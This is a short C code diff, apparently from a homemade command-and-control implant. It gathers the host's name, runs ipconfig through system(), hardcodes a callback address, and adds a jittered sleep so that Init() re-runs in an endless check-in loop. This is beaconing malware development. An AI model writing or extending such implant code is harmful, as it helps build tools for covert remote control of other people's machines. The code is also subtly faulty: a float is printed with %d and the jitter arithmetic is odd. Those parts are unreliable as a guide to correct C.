@@ -46,6 +46,7 @@ struct AgentInformation {
     char *Path;
 }Agent;
 
+
 void Registration() {
     DWORD HostnameLength = 260;
     if (GetComputerNameA(Register.Hostname, &HostnameLength)) {
@@ -66,6 +67,7 @@ void Registration() {
     }
     system("C:\\Windows\\System32\\ipconfig"); // This is a really bad implementation. Change this
 }
+
 
 void Init() {
     Agent.Address = "192.168.142.128";
@@ -109,7 +111,19 @@ void Init() {
 }
 
 
+void Sleep_Time() {
+    int time = 20;
+    int percent = 20;
+    float jitter = (((time * percent / 100) + (rand() % ((time + (time * percent / 100)) + 1))) * 1000);
+    printf("%d", jitter);
+    Sleep(jitter);
+}
+
+
 int main() {
     Registration();    
-    Init();
+    while(TRUE) {
+        Init();
+        Sleep_Time();
+    }
 }
